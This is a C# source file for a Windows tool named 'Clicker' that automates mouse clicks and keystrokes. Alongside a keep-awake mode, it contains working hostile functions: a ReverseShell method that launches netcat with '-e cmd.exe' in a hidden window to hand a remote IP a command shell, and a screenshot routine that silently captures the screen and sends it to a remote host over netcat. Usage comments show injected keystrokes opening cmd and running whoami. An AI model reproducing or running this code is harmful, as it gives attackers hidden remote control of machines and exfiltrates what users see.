﻿using System;
using System.Net;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Diagnostics;

namespace Clicker
{
    class Program
    {
        static Clicker clicker = new Clicker();
        static void Main(string[] args)
        {
            try
            {
                if (args.Length == 0)
                {
                    Console.WriteLine("[*] Sleepless mode.");
                    Sleepless();
                }
                else if (args[0].Equals(Clicker.SWITCH_BG_ARG) && args.Length >= 4) clicker.mode = Clicker.SWITCH_BG;
                else if (args[0].Equals(Clicker.SWITCH_EV_ARG) && args.Length >= 4) clicker.mode = Clicker.SWITCH_EV;
                else if (args[0].Equals(Clicker.SWITCH_SIMPLE_EV_ARG) && args.Length == 2) clicker.mode = Clicker.SWITCH_SIMPLE_EV;
                else
                {
                    Console.WriteLine("Invalid args");
                    return;
                }

                if (clicker.mode == Clicker.SWITCH_SIMPLE_EV)
                {
                    string ev = args[1];
                    string evType = ev.Split(':')[0].ToUpper();
                    string evData = ev.Remove(0, 2);

                    // Click
                    // [ex] clicker.exe -s "C:0,0,L"
                    // [ex] clicker.exe -s "c:0,0,R;;;400,100,R;;;900,800,R"
                    if (evType.Equals(Clicker.EV_TYPE.C.ToString())) clicker.MouseOpe(evData);

                    // Input
                    //https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.sendkeys.send?view=net-5.0
                    // [ex] clicker.exe -s "I:text for testing!"
                    // [ex] clicker.exe -s "I:^{ESC};;;cmd{Enter};;;whoami{Enter}"
                    else if (evType.Equals(Clicker.EV_TYPE.I.ToString())) clicker.InputText(evData);
                }
                else
                {
                    IPAddress buf;
                    if (IPAddress.TryParse(args[1], out buf)) clicker.dstIp = args[1];
                    else
                    {
                        Console.WriteLine("Invalid IP address.");
                        return;
                    }

                    // Reverse Shell info
                    // [ex] clicker.exe -b 127.0.0.1 60000 9999
                    if (clicker.mode == Clicker.SWITCH_BG)
                    {
                        int port = int.Parse(args[2]);
                        if (port > 0 && port < 65536) clicker.cmdPort = port;
                        else
                        {
                            Console.WriteLine("Invalid port number.");
                            return;
                        }
                        port = int.Parse(args[3]);
                        if (port > 0 && port < 65536) clicker.dataPort = port;
                        else
                        {
                            Console.WriteLine("Invalid port number.");
                            return;
                        }
                        clicker.ReverseShell();
                    }
                    // Event info
                    else if (clicker.mode == Clicker.SWITCH_EV)
                    {
                        string ev = args[3];
                        string evType = ev.Split(':')[0].ToUpper();
                        string evData = ev.Remove(0, 2);

                        int port = int.Parse(args[2]);
                        if (port > 0 && port < 65536) clicker.dataPort = port;
                        else
                        {
                            Console.WriteLine("Invalid port number.");
                            return;
                        }

                        // Click
                        //https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.sendkeys.send?view=net-5.0
                        // [ex] clicker.exe -e 127.0.0.1 9999 "C:0,0,L"
                        // [ex] clicker.exe -e 127.0.0.1 9999 "c:0,0,R;;;400,100,R;;;900,800,R"
                        if (evType.Equals(Clicker.EV_TYPE.C.ToString())) clicker.MouseOpe(evData);
                        //Input
                        // [ex] clicker.exe -e 127.0.0.1 9999 "I:text for testing!"
                        // [ex] clicker.exe -e 127.0.0.1 9999 "I:^{ESC};;;cmd{Enter};;;whoami{Enter}"
                        else if (evType.Equals(Clicker.EV_TYPE.I.ToString())) clicker.InputText(evData);
                    }
                }

            }
            catch (Exception e)
            {
                Error(e);
            }
        }
        static void Error(Exception e)
        {
            try
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }

        static void Sleepless()
        {
            try
            {
                string evData = string.Empty;
                while (true)
                {
                    evData = "+";
                    clicker.InputText(evData);

                    evData = "100,0,-";
                    clicker.MouseOpe(evData);
                    Thread.Sleep(1000);
                    evData = "-100,0,-";
                    clicker.MouseOpe(evData);
                    Thread.Sleep(45 * 1000);
                }
            }
            catch(Exception e)
            {
                Error(e);
            }
        }
    }

    class Clicker
    {
        [DllImport("USER32.dll", CallingConvention = CallingConvention.StdCall)]
        static extern void SetCursorPos(int X, int Y);
        [DllImport("USER32.dll", CallingConvention = CallingConvention.StdCall)]
        static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        private const int MOUSEEVENTF_LEFTDOWN = 0x2;
        private const int MOUSEEVENTF_LEFTUP = 0x4;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x8;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;
        private const int MOUSEEVENTF_MOVE = 0x0001;
        private const int MOUSEEVENTF_ABSOLUTE = 0x8000;

        public const int SWITCH_SLEEPLESS = 0;
        public const int SWITCH_BG = 1;
        public const int SWITCH_EV = 2;
        public const int SWITCH_SIMPLE_EV = 3;
        public const string SWITCH_BG_ARG = "-b";
        public const string SWITCH_EV_ARG = "-e";
        public const string SWITCH_SIMPLE_EV_ARG = "-s";
        public const int EV_INTERVAL_SEC = 1;
        public string APP_DIR = System.AppDomain.CurrentDomain.BaseDirectory;
        public enum EV_TYPE { C, I }    //C=Click, I=Input
        public enum EV_CLICK { L, R, L2 }   //L=Left, R=Right, L2=Left Double Click

        public int mode { get; set; } = 0;
        public string dstIp { get; set; } = string.Empty;
        public int cmdPort { get; set; } = 0;
        public int dataPort { get; set; } = 0;

        public int sx { get; set; } = 0;
        public int sy { get; set; } = 0;

        public void InputText(string text)
        {
            try
            {
                if (!String.IsNullOrEmpty(text))
                {
                    string[] delimiter = { ";;;" };
                    string[] dataAry = text.Split(delimiter, StringSplitOptions.None);
                    foreach (var data in dataAry)
                    {
                        Thread.Sleep(3000);
                        SendKeys.SendWait(data);
                    }
                    if (mode != Clicker.SWITCH_SIMPLE_EV && mode != SWITCH_SLEEPLESS) GetScreenShot();
                }
                else Console.WriteLine("Empty text.");
            }
            catch (Exception e)
            {
                Error(e);
            }
        }

        public void MouseOpe(string ev)
        {
            try
            {
                if (!String.IsNullOrEmpty(ev))
                {
                    ev = ev.ToUpper();
                    string[] delimiter = { ";;;" };
                    string[] dataAry = ev.Split(delimiter, StringSplitOptions.None);
                    foreach (var data in dataAry)
                    {
                        Thread.Sleep(2000);
                        int x = int.Parse(data.Split(',')[0]);
                        int y = int.Parse(data.Split(',')[1]);
                        string lr = data.Split(',')[2];

                        if (lr.Equals(Clicker.EV_CLICK.L.ToString()))
                        {
                            SetCursorPos(x, y);
                            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                        }
                        else if (lr.Equals(Clicker.EV_CLICK.R.ToString()))
                        {
                            SetCursorPos(x, y);
                            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                        }
                        else if (lr.Equals(Clicker.EV_CLICK.L2.ToString()))
                        {
                            SetCursorPos(x, y);
                            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                        }
                        else
                        {
                            SetCursorPos(x, y);
                            mouse_event(MOUSEEVENTF_MOVE, x, y, 0, 0);
                        }
                    }

                }
                else Console.WriteLine("Empty event.");
                if (mode != Clicker.SWITCH_SIMPLE_EV && mode != SWITCH_SLEEPLESS) GetScreenShot();
            }
            catch (Exception e)
            {
                Error(e);
            }
        }

        public void ReverseShell()
        {
            try
            {
                ProcessStartInfo proc = new ProcessStartInfo("nc64.exe", $"-nv {this.dstIp} {this.cmdPort} -e cmd.exe");
                proc.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(proc);
                GetScreenShot();
            }
            catch (Exception e)
            {
                Error(e);
            }
        }

        public void GetScreenShot()
        {
            try
            {
                Thread.Sleep(2000);
                Rectangle rc = Screen.PrimaryScreen.Bounds;
                Bitmap bmp = new Bitmap(rc.Width, rc.Height, PixelFormat.Format32bppArgb);
                Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
                string fileName = $"{rc.Width}x{rc.Height}.jpg";
                string filePath = Path.Combine(this.APP_DIR, fileName);
                bmp.Save(filePath, ImageFormat.Jpeg);
                SendScreenShot(filePath);
            }
            catch (Exception e)
            {
                Error(e);
            }
        }

        public void SendScreenShot(string filePath)
        {
            try
            {
                if (!File.Exists(filePath)) return;
                ProcessStartInfo proc = new ProcessStartInfo("cmd.exe", $"/c nc64.exe -nv {this.dstIp} {this.dataPort} -w 5 < \"{filePath}\"");
                proc.WindowStyle = ProcessWindowStyle.Hidden;
                proc.UseShellExecute = false;
                Process.Start(proc);
            }
            catch (Exception e)
            {
                Error(e);
            }
        }

        static void Error(Exception e)
        {
            try
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }
    }
    class ClickerEvent
    {
        const string EV_CLICK = "c";
        const string EV_INPUT_TEXT = "t";
        const string EV_INPUT_KEY = "k";

        string ev { get; set; } = string.Empty;
        string data { get; set; } = string.Empty;

        public ClickerEvent(string ev, string data)
        {
            this.ev = ev;
            this.data = data;
        }
    }
}
